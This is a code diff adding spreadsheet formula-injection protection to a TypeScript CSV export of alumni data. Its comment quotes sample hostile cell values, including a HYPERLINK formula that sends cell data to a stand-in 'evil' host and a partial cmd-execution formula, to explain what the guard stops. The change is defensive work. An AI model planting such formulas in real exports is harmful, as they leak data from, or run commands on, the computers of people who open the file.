@@ -274,10 +274,28 @@ export function aggregateAlumni(
  * RFC-4180 CSV. Every field is quoted unconditionally and inner quotes are
  * doubled, so names like `Bobby "Bo" O'Neil, Jr.` survive a round trip into
  * Excel or Google Sheets.
+ *
+ * Formula injection: Excel and Sheets EVALUATE a cell whose text begins with
+ * `=`, `+`, `-` or `@` — quoting does not stop it. Alumni names, emails and
+ * notes are attacker-supplied (anyone who can get onto a roster or submit a
+ * contact), so a value of `=HYPERLINK("http://evil/"&A1)` would fire the moment
+ * a coach opens the export. A leading apostrophe is the spreadsheet convention
+ * for "treat this cell as literal text".
+ *
+ * Leading whitespace and control characters are skipped before the formula
+ * character is looked for: spreadsheets trim the cell before evaluating it, so
+ * `" =cmd|..."`, a leading tab and `"\n=..."` are all still live formulas. The
+ * `\s` class already covers space, tab, CR, LF and the Unicode spaces; the
+ * explicit \u0000-\u001f range adds the remaining C0 controls (including a
+ * stray BOM-adjacent byte) that `\s` does not.
  */
+const CSV_FORMULA_PREFIX = /^[\s\u0000-\u001f\u200b\ufeff]*[=+\-@]/;
+
 export function toCsvValue(value: unknown): string {
   if (value === null || value === undefined) return '""';
-  return `"${String(value).replace(/"/g, '""')}"`;
+  const text = String(value);
+  const safe = CSV_FORMULA_PREFIX.test(text) ? `'${text}` : text;
+  return `"${safe.replace(/"/g, '""')}"`;
 }
 
 export function toCsvRow(values: unknown[]): string {
